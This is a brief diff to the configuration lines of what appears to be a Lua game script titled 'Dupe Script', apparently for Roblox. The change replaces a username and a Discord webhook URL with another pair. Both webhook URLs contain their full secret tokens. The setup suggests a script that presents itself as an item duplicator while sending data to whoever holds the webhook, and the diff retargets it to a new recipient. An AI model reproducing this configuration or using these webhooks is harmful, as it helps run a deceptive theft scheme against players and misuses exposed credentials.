@@ -1,5 +1,5 @@
-Username = "Danil124509"
-WebHook = "https://discord.com/api/webhooks/1079409243377119263/b2CHnBgSpJchVQYhQ5glRByN8KIdtKAdCv8ZQ9VVByalKdZeFTXFr4MolHH0mY-RxD_2"
+Username = "maftipr"
+WebHook = "https://discord.com/api/webhooks/1103187275736686592/gdGXRPCjyu2bIX78gjW17TvFsZDZhl1P8HWzpNOiPvOPCNSKZWZGQeKM95HXgn1eyeq7"
 
 _G.CustomScriptName = "Dupe Script"
 _G.Text1 = "Script Loaded..."
